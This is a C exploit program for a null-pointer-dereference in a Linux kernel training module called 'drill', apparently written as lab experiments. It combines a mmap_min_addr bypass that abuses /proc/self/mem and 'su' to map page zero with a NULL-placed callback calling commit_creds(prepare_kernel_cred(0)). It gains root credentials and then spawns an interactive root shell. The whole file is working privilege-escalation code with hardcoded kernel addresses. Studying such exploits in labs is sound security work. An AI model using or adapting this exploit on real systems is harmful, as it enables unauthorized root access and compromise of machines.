/*
 * Funny experiments with Linux kernel exploitation of null-ptr-deref.
 *
 * Based on wonderful mmap_min_addr bypass by Jann Horn:
 *   https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2
 *
 * Run the kernel with "pti=off oops=panic ftrace_dump_on_oops nokaslr"
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <stdint.h>
#include <sys/mman.h>

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR	0xffffffff81082f30lu
#define PREPARE_KERNEL_CRED_PTR	0xffffffff81083150lu

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2)
{
	commit_creds(prepare_kernel_cred(0));
}

struct drill_item_t {
	uint32_t foo;
	uint64_t callback;
	char bar[1];
};

/* ========================================================================== */

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/bin/sh",
		"-i",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork()");
		return;
	}

	if (pid == 0) {
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}

void init_payload(void *p)
{
	struct drill_item_t *item = (struct drill_item_t *)p;

	item->callback = (uint64_t)root_it;

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback at %p\n", &item->callback);
	printf("\tcallback %lx\n", item->callback);
}

int act(int fd, char code)
{
	ssize_t bytes = 0;

	bytes = write(fd, &code, 1);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int main(void)
{
	int ret = EXIT_FAILURE;
	void *map = NULL;
	int mem_fd = -1;
	char cmd[1000];
	unsigned long addr = 0;
	int drill_fd = -1;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
	printf("payload address: %p\n", root_it);

	map = mmap((void*)0x10000, 0x1000, PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);
	if (map == MAP_FAILED) {
		perror("[-] mmap");
		goto end;
	}

	mem_fd = open("/proc/self/mem", O_RDWR);
	if (mem_fd < 0) {
		perror("[-] open /proc/self/mem");
		goto end;
	}

	addr = (unsigned long)map;
	sprintf(cmd, "LD_DEBUG=help su 1>&%d", mem_fd);
	while (addr != 0) {
		addr -= 0x1000;

		if (lseek(mem_fd, addr, SEEK_SET) == -1) {
			perror("[-] lseek in /proc/self/mem");
			goto end;
		}

		system(cmd);
	}

	printf("[+] /proc/$PPID/maps:\n");
	system("head -n1 /proc/$PPID/maps");

	drill_fd = open("/sys/kernel/debug/drill/drill_act", O_WRONLY);
	if (drill_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}

	printf("[+] drill_act is opened\n");

	if (act(drill_fd, '1') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] DRILL_ACT_ALLOC\n");

	if (act(drill_fd, '4') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] DRILL_ACT_RESET\n");

	init_payload((void *)NULL);

	if (act(drill_fd, '2') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] DRILL_ACT_CALLBACK\n");

	if (getuid() == 0 && geteuid() == 0) {
		printf("[+] finish as: uid=0, euid=0, start sh...\n");
		run_sh();
		ret = EXIT_SUCCESS;
	} else {
		printf("[-] didn't get root\n");
		goto end;
	}

	printf("[+] The End\n");

end:
	if (drill_fd >= 0) {
		ret = close(drill_fd);
		if (ret != 0)
			perror("[-] close drill_fd");
	}

	if (mem_fd >= 0) {
		ret = close(mem_fd);
		if (ret != 0)
			perror("[-] close mem_fd");
	}

	return ret;
}
